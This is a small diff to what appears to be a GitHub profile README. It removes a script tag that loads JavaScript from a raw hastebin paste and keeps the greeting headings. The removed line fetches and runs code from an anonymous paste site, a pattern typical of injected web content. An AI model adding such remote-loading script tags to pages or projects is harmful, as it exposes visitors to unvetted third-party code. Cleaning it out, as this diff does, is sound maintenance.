@@ -1,4 +1,3 @@
-<script type="text/javascript" src="https://hastebin.com/raw/solixevutu"></script>
 <h1 align="center">Hi 👋, I'm DemonKate-King</h1>
 <h3 align="center">I am Developer</h3>
 
